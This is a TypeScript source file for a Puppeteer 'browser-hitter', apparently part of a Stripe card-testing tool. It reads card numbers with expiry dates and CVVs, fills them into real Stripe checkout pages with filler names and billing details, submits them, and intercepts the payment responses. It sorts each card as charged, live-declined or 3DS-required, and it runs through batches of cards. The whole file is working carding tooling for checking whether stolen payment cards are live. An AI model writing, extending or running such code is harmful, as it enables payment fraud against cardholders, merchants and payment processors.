import puppeteer, { Browser, Page } from "puppeteer";
import { existsSync } from "fs";
import { execSync } from "child_process";
import type { CheckoutSessionData, HitResult } from "./stripe-hitter";
import { classifyDecline, HARD_DECLINE_CODES, type DeclineCategory } from "./response-codes";

const DEBUG = process.env.DEBUG_CHECKER === "1";
function dbg(...args: any[]) { if (DEBUG) console.log("[browser-hitter]", ...args); }

function parseCard(cardStr: string) {
  const parts = cardStr.split("|");
  if (parts.length < 4) return null;
  const [cc, mm, yy, cvv] = parts;
  if (!cc || !mm || !yy || !cvv) return null;
  const year = yy.length === 2 ? `20${yy}` : yy;
  return { cc: cc.trim(), mm: mm.trim(), yy: year, cvv: cvv.trim() };
}

let browserInstance: Browser | null = null;
let _browserAvailable: boolean | null = null;

export async function isBrowserAvailable(): Promise<boolean> {
  if (_browserAvailable !== null) return _browserAvailable;
  // Skip check entirely when Puppeteer was installed without Chromium (Termux)
  if (process.env.PUPPETEER_SKIP_DOWNLOAD === "true" && !findChromiumPath()) {
    dbg("Browser not available: no system chromium and PUPPETEER_SKIP_DOWNLOAD=true");
    _browserAvailable = false;
    return false;
  }
  let _b: import("puppeteer").Browser | null = null;
  try {
    _b = await puppeteer.launch({
      headless: true,
      executablePath: findChromiumPath(),
      args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"],
    });
    _browserAvailable = true;
  } catch {
    _browserAvailable = false;
  } finally {
    if (_b) try { await _b.close(); } catch {}
  }
  dbg("Browser available:", _browserAvailable);
  return _browserAvailable;
}

function findChromiumPath(): string | undefined {
  // 1. Explicit override always wins
  if (process.env.CHROMIUM_PATH) return process.env.CHROMIUM_PATH;

  const PREFIX = process.env.PREFIX || ""; // /data/data/com.termux/files/usr on Termux
  const isTermux = PREFIX.includes("com.termux") || existsSync("/data/data/com.termux");

  const candidates = [
    // ── Termux / Android ─────────────────────────────────────────────────────
    // tur-repo:  pkg install tur-repo && pkg install chromium
    `${PREFIX}/bin/chromium`,
    `${PREFIX}/bin/chromium-browser`,
    // proot-distro Ubuntu:  proot-distro install ubuntu && proot-distro login ubuntu -- apt install chromium-browser
    `${PREFIX}/var/lib/proot-distro/installed-rootfs/ubuntu/usr/bin/chromium-browser`,
    `${PREFIX}/var/lib/proot-distro/installed-rootfs/ubuntu/usr/bin/chromium`,
    // proot-distro Debian
    `${PREFIX}/var/lib/proot-distro/installed-rootfs/debian/usr/bin/chromium`,
    `${PREFIX}/var/lib/proot-distro/installed-rootfs/debian/usr/bin/chromium-browser`,
    // ── Standard Linux ────────────────────────────────────────────────────────
    "/usr/bin/chromium-browser",
    "/usr/bin/chromium",
    "/usr/bin/google-chrome-stable",
    "/usr/bin/google-chrome",
    "/snap/bin/chromium",
    // ── Nix / Replit ──────────────────────────────────────────────────────────
    "/nix/store/zi4f80l169xlmivz8vja8wlphq74qqk0-chromium-125.0.6422.141/bin/chromium",
    // ── macOS ─────────────────────────────────────────────────────────────────
    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
    "/Applications/Chromium.app/Contents/MacOS/Chromium",
  ].filter(Boolean);

  for (const p of candidates) {
    if (existsSync(p)) {
      dbg(`Found Chromium at: ${p}${isTermux ? " (Termux)" : ""}`);
      return p;
    }
  }

  // 2. PATH-based fallback — works even if pkg installs to a non-standard prefix
  if (process.platform !== "win32") {
    for (const cmd of ["chromium", "chromium-browser", "google-chrome", "google-chrome-stable"]) {
      try {
        const found = execSync(`which ${cmd} 2>/dev/null`, { encoding: "utf-8", timeout: 2000 }).trim();
        if (found && existsSync(found)) {
          dbg(`Found Chromium via which: ${found}`);
          return found;
        }
      } catch { /* not in PATH */ }
    }
  } else {
    // Windows: use `where` instead of `which`
    for (const cmd of ["chrome", "chromium"]) {
      try {
        const found = execSync(`where ${cmd}`, { encoding: "utf-8", timeout: 2000 }).trim().split("\n")[0];
        if (found && existsSync(found)) {
          dbg(`Found Chromium via where: ${found}`);
          return found;
        }
      } catch { /* not in PATH */ }
    }
  }

  dbg("No Chromium found — set CHROMIUM_PATH env var or install chromium");
  return undefined;
}

async function getBrowser(): Promise<Browser> {
  if (browserInstance && browserInstance.connected) {
    return browserInstance;
  }

  const chromiumPath = findChromiumPath();
  const PREFIX = process.env.PREFIX || "";
  const isTermux = PREFIX.includes("com.termux") || existsSync("/data/data/com.termux");

  const baseArgs = [
    "--no-sandbox",
    "--disable-setuid-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-software-rasterizer",
    "--disable-extensions",
    "--disable-background-networking",
    "--disable-default-apps",
    "--disable-sync",
    "--disable-translate",
    "--no-first-run",
    "--window-size=1280,800",
  ];

  // Android/Termux: kernel doesn't support process sandboxing or zygote forking
  const termuxArgs = isTermux ? [
    "--single-process",   // run renderer in the same process (required on Android)
    "--no-zygote",        // companion to --single-process
    "--disable-features=IsolateOrigins,site-per-process", // less RAM per tab
  ] : [];

  const launchOptions: any = {
    headless: true,
    args: [...baseArgs, ...termuxArgs],
    // Use system binary whenever one was found (required on ARM/Termux, optional elsewhere)
    ...(chromiumPath ? { executablePath: chromiumPath } : {}),
  };

  try {
    browserInstance = await puppeteer.launch(launchOptions);
    _browserAvailable = true;
    dbg("Browser launched", chromiumPath ? `(${chromiumPath})` : "(bundled)");
  } catch (err: any) {
    _browserAvailable = false;
    dbg("Browser launch failed:", err.message);
    throw new Error(`Browser not available: ${err.message}. Install chromium or set CHROMIUM_PATH.`);
  }

  return browserInstance;
}

export async function closeBrowser(): Promise<void> {
  if (browserInstance) {
    try {
      await browserInstance.close();
    } catch {}
    browserInstance = null;
    dbg("Browser closed");
  }
}

interface ConfirmInterceptResult {
  type: "success" | "decline" | "error" | "3ds";
  code?: string;
  message?: string;
  piId?: string;
  declineCode?: string;
}

async function waitMs(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

async function typeInField(page: Page, selector: string, text: string, fieldName: string): Promise<boolean> {
  try {
    const el = await page.$(selector);
    if (el) {
      await el.click({ clickCount: 3 });
      await waitMs(100);
      await el.type(text, { delay: 25 });
      dbg(`Filled ${fieldName}`);
      return true;
    }
  } catch (e: any) {
    dbg(`Error filling ${fieldName}: ${e.message}`);
  }
  return false;
}

export async function browserHitCard(
  session: CheckoutSessionData,
  cardStr: string,
  checkoutUrl: string,
): Promise<HitResult> {
  const start = Date.now();
  const parsed = parseCard(cardStr);
  if (!parsed) {
    return { card: cardStr, status: "error", response: "Invalid card format", latency: 0 };
  }

  const { cc, mm, yy, cvv } = parsed;
  const brand = cc.startsWith("4") ? "VISA" : cc.startsWith("5") ? "MC" : cc.startsWith("3") ? "AMEX" : "CARD";
  const last4 = cc.slice(-4);

  let page: Page | null = null;

  try {
    const browser = await getBrowser();
    page = await browser.newPage();

    await page.setViewport({ width: 1280, height: 800 });
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    );

    let confirmResult: ConfirmInterceptResult | null = null;

    await page.setRequestInterception(true);
    page.on("request", (req) => {
      const resourceType = req.resourceType();
      if (["image", "font", "media"].includes(resourceType)) {
        req.abort().catch(() => {});
      } else {
        req.continue().catch(() => {});
      }
    });

    page.on("response", async (response) => {
      const url = response.url();

      const isConfirm = (url.includes("/payment_pages/") && url.includes("/confirm")) ||
        (url.includes("/v1/payment_intents/") && url.includes("/confirm")) ||
        (url.includes("/v1/setup_intents/") && url.includes("/confirm")) ||
        (url.includes("/v1/subscription") && url.includes("/confirm"));

      if (!isConfirm) return;

      try {
        const text = await response.text();
        if (!text || text.length < 5) return;
        const body = JSON.parse(text);
        dbg("Intercepted confirm response:", url.substring(0, 80), "→", JSON.stringify(body).substring(0, 300));

        if (body.error) {
          const errType = body.error.type;
          const code = body.error.decline_code || body.error.code || "unknown";
          const msg = body.error.message || "";

          if (errType === "card_error") {
            confirmResult = { type: "decline", code, message: msg, declineCode: code };
          } else {
            confirmResult = { type: "error", code, message: msg };
          }
          return;
        }

        if (body.status === "complete" || body.payment_status === "paid") {
          const piId = body.payment_intent?.id || body.subscription?.latest_invoice?.payment_intent?.id || "";
          confirmResult = { type: "success", piId };
        } else if (body.payment_intent?.status === "succeeded") {
          confirmResult = { type: "success", piId: body.payment_intent.id };
        } else if (body.payment_intent?.status === "requires_action") {
          confirmResult = { type: "3ds", piId: body.payment_intent.id };
        } else if (body.setup_intent?.status === "succeeded") {
          confirmResult = { type: "success", piId: body.setup_intent.id };
        } else if (body.setup_intent?.status === "requires_action") {
          confirmResult = { type: "3ds", piId: body.setup_intent.id };
        } else if (body.status === "requires_action" || body.next_action) {
          confirmResult = { type: "3ds", piId: body.id };
        } else if (body.status === "succeeded") {
          confirmResult = { type: "success", piId: body.id };
        }
      } catch {}
    });

    dbg(`Navigating to: ${checkoutUrl.substring(0, 100)}...`);

    try {
      await page.goto(checkoutUrl, { waitUntil: "domcontentloaded", timeout: 45000 });
    } catch (navErr: any) {
      dbg(`Navigation warning (may be ok): ${navErr.message?.substring(0, 100)}`);
      await waitMs(2000);
    }

    dbg(`Page URL after nav: ${page.url()}`);
    await waitMs(4000);
    dbg(`Page URL after settle: ${page.url()}`);

    try {
      const cardMethodInfo = await page.evaluate(() => {
        const radios = document.querySelectorAll('input[type="radio"]');
        for (const radio of radios) {
          const val = (radio as HTMLInputElement).value || "";
          if (val === "card") {
            const rect = radio.getBoundingClientRect();
            const parent = (radio as HTMLElement).closest('[class*="PaymentMethod"], div, label');
            const parentRect = parent ? parent.getBoundingClientRect() : rect;
            return {
              type: "radio-card",
              x: parentRect.x + parentRect.width / 2,
              y: parentRect.y + parentRect.height / 2,
            };
          }
        }

        for (const radio of radios) {
          const parent = (radio as HTMLElement).closest('[class*="PaymentMethod"], div, label, li');
          if (parent) {
            const parentText = (parent.textContent || "").replace(/\s+/g, " ").trim();
            if (/visa|mastercard|amex|american express/i.test(parentText) && parentText.length < 100) {
              const rect = parent.getBoundingClientRect();
              return {
                type: `parent-match: ${parentText.substring(0, 40)}`,
                x: rect.x + rect.width / 2,
                y: rect.y + rect.height / 2,
              };
            }
          }
        }

        const first = document.querySelector('input[type="radio"]');
        if (first) {
          const parent = (first as HTMLElement).closest('[class*="PaymentMethod"], div, label');
          const rect = (parent || first).getBoundingClientRect();
          return {
            type: "first-radio",
            x: rect.x + rect.width / 2,
            y: rect.y + rect.height / 2,
          };
        }
        return null;
      });

      if (cardMethodInfo) {
        dbg(`Found Card payment method (${cardMethodInfo.type}), clicking at (${Math.round(cardMethodInfo.x)}, ${Math.round(cardMethodInfo.y)})`);
        await page.mouse.click(cardMethodInfo.x, cardMethodInfo.y);
        await waitMs(3000);

        await page.screenshot({ path: "/tmp/browser-hitter-afterclick.png", fullPage: true }).catch(() => {});
        dbg("Screenshot after card click saved");
      } else {
        dbg("No Card payment method radio found (may already be selected)");
      }
    } catch (e: any) {
      dbg(`Card radio click error (non-fatal): ${e.message?.substring(0, 80)}`);
    }

    const mainCardSelectors = [
      'input[name="cardNumber"]',
      'input[id="cardNumber"]',
      '[data-elements-stable-field-name="cardNumber"]',
      'input[autocomplete="cc-number"]',
      'input[placeholder*="card number" i]',
      'input[placeholder*="1234" i]',
    ];

    let inputMode: "main" | "iframe" | null = null;

    for (let attempt = 0; attempt < 2 && !inputMode; attempt++) {
      for (const sel of mainCardSelectors) {
        try {
          await page.waitForSelector(sel, { timeout: 3000 });
          inputMode = "main";
          dbg(`Card input found on main page via: ${sel} (attempt ${attempt + 1})`);
          break;
        } catch {}
      }

      if (!inputMode) {
        const frames = page.frames();
        for (const frame of frames) {
          const fUrl = frame.url();
          if (!fUrl.includes("stripe.com") || fUrl.includes("hcaptcha") || fUrl.includes("human-security") || fUrl.includes("controller") || fUrl.includes("link-login") || fUrl.includes("express-checkout") || fUrl.includes("m-outer")) continue;
          try {
            const cardEl = await frame.$('input[name="cardnumber"], input[name="cardNumber"], input[autocomplete="cc-number"]');
            if (cardEl) {
              inputMode = "iframe";
              dbg(`Card input found in iframe: ${fUrl.substring(0, 80)} (attempt ${attempt + 1})`);
              break;
            }
          } catch {}
        }
      }

      if (!inputMode) {
        dbg(`Card input not found (attempt ${attempt + 1}), waiting...`);
        await waitMs(3000);
      }
    }

    if (!inputMode) {
      dbg("No card input found anywhere, taking debug screenshot...");
      await page.screenshot({ path: "/tmp/browser-hitter-debug.png", fullPage: true }).catch(() => {});
      const frames = page.frames();
      dbg(`Total frames: ${frames.length}`);
      for (const frame of frames) {
        dbg(`  Frame: ${frame.url().substring(0, 80)}`);
      }

      return {
        card: cardStr,
        status: "error",
        response: `BROWSER ERROR ⚠ Card input not found on checkout page | ${brand} ...${last4}`,
        latency: Date.now() - start,
      };
    }

    await waitMs(500);

    const emailFilled = await typeInField(page, 'input[name="email"], input[id="email"], input[type="email"]', "test@checkout.com", "email");
    if (emailFilled) await waitMs(300);

    const nameFilled = await typeInField(page, 'input[name="billingName"], input[id="billingName"]', "John Smith", "name");
    if (nameFilled) await waitMs(300);

    if (inputMode === "main") {
      dbg("Filling card on main page...");
      for (const sel of mainCardSelectors) {
        const filled = await typeInField(page, sel, cc, "cardNumber");
        if (filled) break;
      }
      await waitMs(400);

      const expSelectors = ['input[name="cardExpiry"]', 'input[id="cardExpiry"]', '[data-elements-stable-field-name="cardExpiry"]', 'input[autocomplete="cc-exp"]'];
      for (const sel of expSelectors) {
        const filled = await typeInField(page, sel, `${mm} / ${yy.slice(-2)}`, "expiry");
        if (filled) break;
      }
      await waitMs(400);

      const cvcSelectors = ['input[name="cardCvc"]', 'input[id="cardCvc"]', '[data-elements-stable-field-name="cardCvc"]', 'input[autocomplete="cc-csc"]'];
      for (const sel of cvcSelectors) {
        const filled = await typeInField(page, sel, cvv, "cvc");
        if (filled) break;
      }
      await waitMs(300);
    } else {
      dbg("Filling card in Stripe iframe...");
      const frames = page.frames();
      let filledCard = false;
      let filledExp = false;
      let filledCvc = false;

      for (const frame of frames) {
        const fUrl = frame.url();
        if (!fUrl.includes("stripe.com") || fUrl.includes("hcaptcha") || fUrl.includes("human-security") || fUrl.includes("controller") || fUrl.includes("link-login") || fUrl.includes("express-checkout") || fUrl.includes("m-outer")) continue;

        try {
          if (!filledCard) {
            const cardEl = await frame.$('input[name="cardnumber"], input[name="cardNumber"], input[autocomplete="cc-number"]');
            if (cardEl) {
              await cardEl.click();
              await waitMs(100);
              await cardEl.type(cc, { delay: 30 });
              filledCard = true;
              dbg("Filled cardNumber in iframe");
              await waitMs(300);
            }
          }
          if (!filledExp) {
            const expEl = await frame.$('input[name="exp-date"], input[name="cardExpiry"], input[autocomplete="cc-exp"]');
            if (expEl) {
              await expEl.click();
              await waitMs(100);
              await expEl.type(`${mm}${yy.slice(-2)}`, { delay: 30 });
              filledExp = true;
              dbg("Filled expiry in iframe");
              await waitMs(300);
            }
          }
          if (!filledCvc) {
            const cvcEl = await frame.$('input[name="cvc"], input[name="cardCvc"], input[autocomplete="cc-csc"]');
            if (cvcEl) {
              await cvcEl.click();
              await waitMs(100);
              await cvcEl.type(cvv, { delay: 30 });
              filledCvc = true;
              dbg("Filled CVC in iframe");
              await waitMs(300);
            }
          }
        } catch (e: any) {
          dbg(`Frame fill error: ${e.message?.substring(0, 60)}`);
        }
      }

      if (!filledCard) {
        dbg("WARNING: Could not fill card number in any iframe");
      }
    }

    try {
      const countrySelect = await page.$('select[name="billingCountry"], select[id="billingCountry"]');
      if (countrySelect) {
        await page.select('select[name="billingCountry"], select[id="billingCountry"]', 'US');
        await waitMs(300);
      }
    } catch {}

    await typeInField(page, 'input[name="billingPostalCode"], input[id="billingPostalCode"]', "10001", "zip");
    await waitMs(300);

    dbg("All fields filled, waiting before submit...");
    await waitMs(2000);

    await page.screenshot({ path: "/tmp/browser-hitter-prefill.png", fullPage: true }).catch(() => {});

    const submitSelectors = [
      '.SubmitButton',
      'button[type="submit"]',
      '[data-testid="hosted-payment-submit-button"]',
      'button.SubmitButton-IconContainer',
      '.SubmitButton-IconContainer',
    ];

    let submitted = false;
    for (const sel of submitSelectors) {
      try {
        const btn = await page.$(sel);
        if (btn) {
          dbg(`Clicking submit via: ${sel}`);
          await btn.click();
          submitted = true;
          break;
        }
      } catch {}
    }

    if (!submitted) {
      dbg("No submit button found, pressing Enter...");
      await page.keyboard.press("Enter");
    }

    dbg("Waiting for confirm response...");
    const maxWait = 30000;
    const startWait = Date.now();
    while (!confirmResult && Date.now() - startWait < maxWait) {
      await waitMs(500);

      if (!confirmResult) {
        try {
          const errorText = await page.evaluate(() => {
            const errorEl = document.querySelector('[class*="Error"], [role="alert"], .FieldError');
            return errorEl?.textContent?.trim() || "";
          });
          if (errorText && errorText.length > 5 && Date.now() - startWait > 5000) {
            dbg(`Page error detected: ${errorText}`);
            const lc = errorText.toLowerCase();
            if (lc.includes("declined") || lc.includes("insufficient") || lc.includes("expired") || lc.includes("incorrect") || lc.includes("card number") || lc.includes("security code")) {
              let code = "generic_decline";
              if (lc.includes("test card")) code = "test_card_declined";
              else if (lc.includes("insufficient")) code = "insufficient_funds";
              else if (lc.includes("expired")) code = "expired_card";
              else if (lc.includes("incorrect") && lc.includes("number")) code = "incorrect_number";
              else if (lc.includes("incorrect") && lc.includes("cvc")) code = "incorrect_cvc";
              else if (lc.includes("security code")) code = "incorrect_cvc";
              else if (lc.includes("stolen")) code = "stolen_card";
              else if (lc.includes("lost")) code = "lost_card";
              confirmResult = { type: "decline", code, message: errorText, declineCode: code };
            }
          }
        } catch {}
      }
    }

    const latency = Date.now() - start;

    if (!confirmResult) {
      const currentUrl = page.url();
      dbg(`No confirm result. Final URL: ${currentUrl}`);

      if (currentUrl.includes("success") || currentUrl.includes("complete") || currentUrl.includes("thank")) {
        return {
          card: cardStr,
          status: "success",
          response: `CHARGED ✓ ${session.amount} ${session.currency} (Browser) | ${brand} ...${last4}`,
          latency,
          sessionLocked: true,
        };
      }

      try {
        const visibleError = await page.evaluate(() => {
          const els = document.querySelectorAll('[class*="error" i], [class*="Error"], [role="alert"]');
          for (const el of els) {
            const text = el.textContent?.trim();
            if (text && text.length > 3) return text;
          }
          return "";
        });
        if (visibleError) {
          return {
            card: cardStr,
            status: "error",
            response: `BROWSER ERROR ⚠ ${visibleError.substring(0, 120)} | ${brand} ...${last4}`,
            latency,
          };
        }
      } catch {}

      return {
        card: cardStr,
        status: "error",
        response: `BROWSER TIMEOUT ⚠ No confirm response in ${Math.round(maxWait / 1000)}s | ${brand} ...${last4}`,
        latency,
      };
    }

    switch (confirmResult.type) {
      case "success":
        return {
          card: cardStr,
          status: "success",
          response: `CHARGED ✓ ${session.amount} ${session.currency} (Browser) | ${brand} ...${last4}${confirmResult.piId ? ` | PI: ${confirmResult.piId}` : ""}`,
          latency,
          piId: confirmResult.piId,
          sessionLocked: true,
        };

      case "decline": {
        const code = confirmResult.declineCode || confirmResult.code || "unknown";
        if (HARD_DECLINE_CODES.has(code)) {
          return {
            card: cardStr,
            status: "declined",
            response: `DECLINED ✗ ${code} | ${brand} ...${last4} | ${confirmResult.message?.substring(0, 80) || ""}`,
            latency,
            declineCategory: "hard",
          };
        }
        return {
          card: cardStr,
          status: "declined",
          response: `DECLINED (LIVE) ⚡ ${code} | ${brand} ...${last4} | ${confirmResult.message?.substring(0, 80) || ""}`,
          latency,
          declineCategory: classifyDecline(code),
        };
      }

      case "3ds":
        return {
          card: cardStr,
          status: "success",
          response: `3DS REQUIRED ⚠ ${session.amount} ${session.currency} (Browser) | ${brand} ...${last4}${confirmResult.piId ? ` | PI: ${confirmResult.piId}` : ""}`,
          latency,
          piId: confirmResult.piId,
          sessionLocked: true,
        };

      case "error":
        return {
          card: cardStr,
          status: "error",
          response: `SESSION ERROR ⚠ ${confirmResult.message?.substring(0, 100) || "Unknown error"} | ${brand} ...${last4}`,
          latency,
        };
    }

    // Defensive fallback — the switch above is exhaustive over the union, but
    // guarantee a HitResult is always returned (and satisfy the type checker).
    return {
      card: cardStr,
      status: "error",
      response: `BROWSER ERROR ⚠ Unhandled result | ${brand} ...${last4}`,
      latency,
    };
  } catch (e: any) {
    const latency = Date.now() - start;
    dbg(`Browser hit error: ${e.message}`);
    return {
      card: cardStr,
      status: "error",
      response: `BROWSER ERROR ⚠ ${e.message?.substring(0, 100)} | ${brand} ...${last4}`,
      latency,
    };
  } finally {
    if (page) {
      try { await page.close(); } catch {}
    }
  }
}

export async function browserHitCards(
  session: CheckoutSessionData,
  cards: string[],
  checkoutUrl: string,
  delay: number = 2000,
  onResult?: (result: HitResult, index: number) => void,
): Promise<HitResult[]> {
  // Fast-path: if browser definitely unavailable, return errors for all cards
  if (_browserAvailable === false || (process.env.PUPPETEER_SKIP_DOWNLOAD === "true" && !findChromiumPath())) {
    _browserAvailable = false;
    return cards.map(card => ({
      card: card.trim(),
      status: "error" as const,
      response: "BROWSER UNAVAILABLE ⚠ No Chromium found. Disable browser mode or install chromium via: pkg install chromium",
      latency: 0,
    }));
  }

  const results: HitResult[] = [];

  for (let i = 0; i < cards.length; i++) {
    const cardStr = cards[i].trim();
    if (!cardStr) continue;

    dbg(`Browser hit card ${i + 1}/${cards.length}: ${cardStr.substring(0, 6)}...`);
    const result = await browserHitCard(session, cardStr, checkoutUrl);
    results.push(result);

    if (onResult) {
      onResult(result, i);
    }

    if (result.sessionLocked) {
      for (let j = i + 1; j < cards.length; j++) {
        const skipped: HitResult = {
          card: cards[j].trim(),
          status: "error",
          response: "SKIPPED ⚠ Session locked by previous card (Browser mode — one card per session)",
          latency: 0,
        };
        results.push(skipped);
        if (onResult) onResult(skipped, j);
      }
      break;
    }

    if (i < cards.length - 1 && delay > 0) {
      await waitMs(delay);
    }
  }

  return results;
}
